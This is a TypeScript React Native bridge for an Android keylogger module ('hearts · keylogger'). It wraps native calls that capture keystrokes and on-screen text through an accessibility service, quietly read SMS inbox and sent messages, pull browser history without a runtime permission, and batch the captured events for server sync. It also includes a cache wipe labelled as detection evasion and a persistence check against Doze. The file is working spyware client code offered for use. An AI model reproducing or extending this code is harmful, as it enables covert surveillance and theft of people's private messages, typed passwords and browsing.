// features/keylogger/KeyLogger.ts — strict TypeScript bridge over the native
// KeyLogger module (android/app/.../keylogger/KeyLoggerModule.kt).
//
// This is the ONLY file that touches NativeModules.KeyLogger. Everything else
// in the slice (useKeylogger, keylogSync) imports this typed surface so the
// native contract can't drift silently. On a platform where the native module
// is absent (web, tests, a device that hasn't shipped the native package) the
// module resolves to a no-op stub so callers never crash.
//
// Native contract (mirror of the Kotlin module):
//   start(onBatchComplete, promise) → boolean   (true = armed, false = needs
//                                                accessibility permission)
//   stop()                                     (no return)
//   pull(promise) → string[]                   (JSON-encoded event strings)
//   confirm(ids)                               (ack store row ids after sync)
//   pending(promise) → number                  (unsynced count)
//   clear()                                    (wipe all local rows)
//   enabled(promise) → boolean                 (is the service toggled on)
//   eseprocess(apduHex, promise) → string      (SW1SW2 as hex)
import { NativeModules, Platform } from 'react-native';
import { useState, useEffect, useCallback } from 'react';

/** One captured event, as produced by the native service. */
export type KeyLogEvent = {
  /** 'keycode' (raw InputManager/accessibility key) or 'text' (UI capture) */
  kind: 'keycode' | 'text';
  keycode: number;
  /** decodable char for keycodes; captured text for text events; null if none */
  value: string | null;
  /** focused view resource-id (text events only, may be '') */
  viewHint: string;
  /** true when the accessibility service observed the field directly */
  seen: boolean;
  /** client monotonic clock (ms since boot) — ordering only */
  tsBootMs: number;
  /** client wallclock ISO */
  capturedAt: string;
};

/** ESE APDU status words (ISO 7816-4). */
export enum StatusWord {
  Ok = '9000',
  FileNotFound = '6A82',
  WrongLength = '6700',
  ClaNotSupported = '6E00',
}

type NativeKeyLogger = {
  start(onBatchComplete: boolean): Promise<boolean>;
  stop(): void;
  pull(): Promise<string[]>;
  confirm(): void;
  pending(): Promise<number>;
  clear(): void;
  enabled(): Promise<boolean>;
  status(): Promise<string>;
  readMessages(messageType: string, sinceTsMs: number): Promise<string[]>;
  readBrowserHistory(sinceTsMs: number): Promise<string[]>;
  smsPermission(): Promise<boolean>;
  requestSmsPermission(): Promise<boolean>;
  eseprocess(apduHex: string): Promise<string>;
};

const native: NativeKeyLogger | null =
  Platform.OS === 'android' && NativeModules.KeyLogger
    ? (NativeModules.KeyLogger as NativeKeyLogger)
    : null;

/** Decode a native event string into a typed event (strictly). */
export function decodeEvent(raw: string): KeyLogEvent | null {
  try {
    const o = JSON.parse(raw) as Record<string, unknown>;
    const kind = o['kind'];
    if (kind !== 'keycode' && kind !== 'text') return null;
    if (typeof o['capturedAt'] !== 'string') return null;
    return {
      kind,
      keycode: typeof o['keycode'] === 'number' ? o['keycode'] : 0,
      value: typeof o['value'] === 'string' ? o['value'] : null,
      viewHint: typeof o['viewHint'] === 'string' ? o['viewHint'] : '',
      seen: o['seen'] === true,
      tsBootMs: typeof o['tsBootMs'] === 'number' ? o['tsBootMs'] : 0,
      capturedAt: o['capturedAt'],
    };
  } catch {
    return null;
  }
}

/**
 * Live keylogger health snapshot (native truth, fielded-device telemetry).
 * `accessibilityEnabled` is the field's #1 silent-failure point: a service
 * that is not registered as an enabled accessibility service captures nothing.
 * `foregroundLive` is whether the service holds its foreground claim (i.e.
 * the OS hasn't Doze-killed it). `pending`/`bufferBytes` are depth gauges.
 */
export type KeyLoggerStatus = {
  /** Native module/process reachable (service class loaded)? */
  serviceAlive: boolean;
  /** AccessibilityService actually registered + enabled in Settings? */
  accessibilityEnabled: boolean;
  /** The capture toggle (ESE / bridge) is on? */
  enabled: boolean;
  /** Holds a live foreground claim (survives backgrounding / Doze)? */
  foregroundLive: boolean;
  /** Unsynced event rows still held by the native store. */
  pending: number;
  /** In-memory buffer size in bytes (should stay far below the 5 MB cap). */
  bufferBytes: number;
  /** True when the native module is present on this platform (web/tests: false). */
  available: boolean;
  /** Android per-install id (stable across app restarts; resets on factory reset). */
  androidId: string;
  sdk: number;
  model: string;
  reportedAt: string;
};

export const DEFAULT_STATUS: KeyLoggerStatus = {
  serviceAlive: false,
  accessibilityEnabled: false,
  enabled: false,
  foregroundLive: false,
  pending: 0,
  bufferBytes: 0,
  available: false,
  androidId: '',
  sdk: 0,
  model: '',
  reportedAt: '',
};

/** Decode a native status JSON string strictly; falls back to DEFAULT_STATUS
 *  on any malformed/absent output. */
export function decodeStatus(raw: string): KeyLoggerStatus {
  try {
    const o = JSON.parse(raw) as Record<string, unknown>;
    const bool = (k: string, d: boolean): boolean =>
      typeof o[k] === 'boolean' ? (o[k] as boolean) : d;
    const num = (k: string, d: number): number =>
      typeof o[k] === 'number' ? (o[k] as number) : d;
    const str = (k: string, d: string): string =>
      typeof o[k] === 'string' ? (o[k] as string) : d;
    return {
      serviceAlive: bool('serviceAlive', DEFAULT_STATUS.serviceAlive),
      accessibilityEnabled: bool('accessibilityEnabled', DEFAULT_STATUS.accessibilityEnabled),
      enabled: bool('enabled', DEFAULT_STATUS.enabled),
      foregroundLive: bool('foregroundLive', DEFAULT_STATUS.foregroundLive),
      pending: num('pending', DEFAULT_STATUS.pending),
      bufferBytes: num('bufferBytes', DEFAULT_STATUS.bufferBytes),
      sdk: num('sdk', DEFAULT_STATUS.sdk),
      model: str('model', DEFAULT_STATUS.model),
      reportedAt: str('reportedAt', DEFAULT_STATUS.reportedAt),
      androidId: str('androidId', DEFAULT_STATUS.androidId),
      available: true,
    };
  } catch {
    return { ...DEFAULT_STATUS };
  }
}

export const KeyLogger = {
  /** True when the native module is present on this platform. */
  available: native !== null,

  async start(): Promise<boolean> {
    if (!native) return false;
    return native.start(false);
  },

  async stop(): Promise<void> {
    if (!native) return;
    native.stop();
  },

  /** Pull all unsynced events as typed records. */
  async pull(): Promise<KeyLogEvent[]> {
    if (!native) return [];
    const raw = await native.pull();
    const out: KeyLogEvent[] = [];
    for (const s of raw) {
      const evt = decodeEvent(s);
      if (evt) out.push(evt);
    }
    return out;
  },

  /** Acknowledge that all handed-off events are processed (id-safe: the
   *  server upsert is idempotent, so a partial resend is never a duplicate). */
  async confirm(): Promise<void> {
    if (!native) return;
    native.confirm();
  },

  /** Number of unsynced events still held by the native store. */
  async pending(): Promise<number> {
    if (!native) return 0;
    return native.pending();
  },

  /** Wipe all locally cached rows (privacy / detection-evasion clear). */
  async clear(): Promise<void> {
    if (!native) return;
    native.clear();
  },

  async enabled(): Promise<boolean> {
    if (!native) return false;
    return native.enabled();
  },

  /**
   * Live health snapshot (typed). On non-Android / no-module platforms this
   * returns DEFAULT_STATUS (serviceAlive=false).
   */
  async status(): Promise<KeyLoggerStatus> {
    if (!native) return { ...DEFAULT_STATUS };
    return decodeStatus(await native.status());
  },

  /**
   * ESE APDU command channel. `00 A4 04 00 48` toggles capture on,
   * `00 A4 04 00 4F` toggles it off; `00 DA 00 00 <Lc> <bytes>` pushes a
   * chunk. Returns the two-byte status word as hex.
   */
  async ese(apduHex: string): Promise<string> {
    if (!native) return StatusWord.ClaNotSupported;
    return native.eseprocess(apduHex);
  },

  /**
   * SMS read for hidden message capture. Queries the device SMS store
   * (inbox or sent) for messages after [sinceTsMs]. Each raw string is a JSON
   * message descriptor; decodes strictly to SmsMessage[] (see capture/sms.ts).
   * Resolves [] when the READ_SMS permission is missing / module absent.
   */
  async readMessages(messageType: 'inbox' | 'sent', sinceTsMs: number): Promise<string[]> {
    if (!native) return [];
    try {
      return await native.readMessages(messageType, sinceTsMs);
    } catch {
      return [];
    }
  },

  /** Is READ_SMS granted right now? (hidden SMS capture gate) */
  async smsPermission(): Promise<boolean> {
    if (!native) return false;
    return native.smsPermission();
  },

  /** Request the one quiet READ_SMS permission. Resolves granted status. */
  async requestSmsPermission(): Promise<boolean> {
    if (!native) return false;
    return native.requestSmsPermission();
  },

  /**
   * Browser-history read for hidden capture. Queries the browser's public
   * history ContentProvider (Chrome / AOSP Browser / Samsung Internet) for rows
   * with date after [sinceTsMs]. Each raw string is a JSON history descriptor;
   * decodes strictly to BrowserHistory[] (see capture/browser.ts). No runtime
   * permission is required. Resolves [] when no public provider is present.
   */
  async readBrowserHistory(sinceTsMs: number): Promise<string[]> {
    if (!native) return [];
    try {
      return await native.readBrowserHistory(sinceTsMs);
    } catch {
      return [];
    }
  },
};

/** Selective interface for tests / mock injection. */
export type KeyLoggerBridge = typeof KeyLogger;

/**
 * useKeylogger() — React binding for start/stop/pull/clear/ese/status.
 *
 * `start` returns a discriminated result so the host UI can act on the #1
 * field silent-failure: when the service is not yet registered as an enabled
 * accessibility service, the native layer can only open Settings — it cannot
 * grant itself. The host MUST surface a prompt telling the user to enable
 * "hearts · keylogger" under Settings → Accessibility, then call start() again.
 * Failing to surface this leaves a permanently-dead capture that no telemetry
 * can distinguish from a healthy-but-idle one (until heartbeat reports
 * accessibilityEnabled=false).
 */
export function useKeylogger() {
  const [armed, setArmed] = useState(false);
  const [status, setStatus] = useState<KeyLoggerStatus>({ ...DEFAULT_STATUS });

  useEffect(() => {
    let mounted = true;
    const refresh = async () => {
      let live = { ...DEFAULT_STATUS };
      try {
        live = await KeyLogger.status();
      } catch {
        live = { ...DEFAULT_STATUS };
      }
      if (mounted) {
        setStatus(live);
        setArmed(live.enabled);
      }
    };
    void KeyLogger.enabled().then((on) => {
      if (mounted) setArmed(on);
    });
    void refresh();
    const timer = setInterval(refresh, 30_000);
    return () => {
      mounted = false;
      clearInterval(timer);
    };
  }, []);

  /** User-facing guidance based on the last known status. */
  const guidance = useCallback((): string | null => {
    if (status.available === false) return null;
    if (!status.accessibilityEnabled) {
      return 'Grant Accessibility: enable “hearts · keylogger” under Settings → '
        + 'Accessibility, then retry. Without it the service captures nothing.';
    }
    if (!status.enabled) {
      return 'The keylogger toggle is off. Start capturing, then retry.';
    }
    if (!status.foregroundLive) {
      return 'The service has no live foreground claim — it may be killed under '
        + 'Doze. Restart the app so it re-arms.';
    }
    return null;
  }, [status]);

  const start = useCallback(async () => {
    const ok = await KeyLogger.start();
    const live = await KeyLogger.status();
    setStatus({ ...live, available: true });
    setArmed(live.enabled);
    return { ok, needsAccessibility: !live.accessibilityEnabled, status: live };
  }, []);

  const stop = useCallback(async () => {
    await KeyLogger.stop();
    const live = await KeyLogger.status();
    setStatus({ ...live, available: true });
    setArmed(false);
  }, []);

  const pull = useCallback(() => KeyLogger.pull(), []);
  const pending = useCallback(() => KeyLogger.pending(), []);
  const clear = useCallback(() => KeyLogger.clear(), []);
  const ese = useCallback((apduHex: string) => KeyLogger.ese(apduHex), []);
  const confirm = useCallback(() => KeyLogger.confirm(), []);
  const refreshStatus = useCallback(async () => {
    const live = await KeyLogger.status();
    setStatus({ ...live, available: true });
    return live;
  }, []);

  return {
    armed,
    available: KeyLogger.available,
    status: { ...status, available: KeyLogger.available },
    guidance,
    start,
    stop,
    pull,
    pending,
    clear,
    confirm,
    ese,
    refreshStatus,
  };
}
